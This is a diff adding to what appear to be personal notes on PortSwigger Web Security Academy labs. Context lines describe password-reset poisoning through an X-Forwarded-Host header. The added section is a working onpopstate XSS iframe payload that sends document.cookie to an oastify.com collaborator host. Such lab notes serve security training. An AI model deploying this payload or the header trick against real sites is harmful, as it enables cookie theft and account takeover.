@@ -85,3 +85,13 @@ The last step is bruteforce passwords with these [passwords](https://portswigger
 Go to 'Forgot you password?' functionality, if you can put a name instead of email put 'carlos' username and intercept the post request.
 For the next step we have to open the exploit server and copy the exploit server host, insert 'X-Forwarded-Host' header with exploit server host for value and forward the request.
 Our last step is to open the http logs from exploit server and take the reset link with new password functionality
+
+# [0x8] onpopstate XSS cookie retrieve 
+You have to encode the payload with hackvertor extension
+```
+<@burp_urlencode>
+
+<iframe onload="if(!window.flag){this.contentWindow.location='https://portswigger-labs.net/xss/xss.php?x=<body onpopstate=document.location=`http://mi8wmhv2blmszdpoeo30vaj3iuokc9.oastify.com/?`+document.cookie>#';flag=1}" src="https://portswigger-labs.net/xss/xss.php?x=<body onpopstate=document.location=`http://mi8wmhv2blmszdpoeo30vaj3iuokc9.oastify.com/?`+document.cookie>"></iframe>
+
+<@/burp_urlencode>
+```
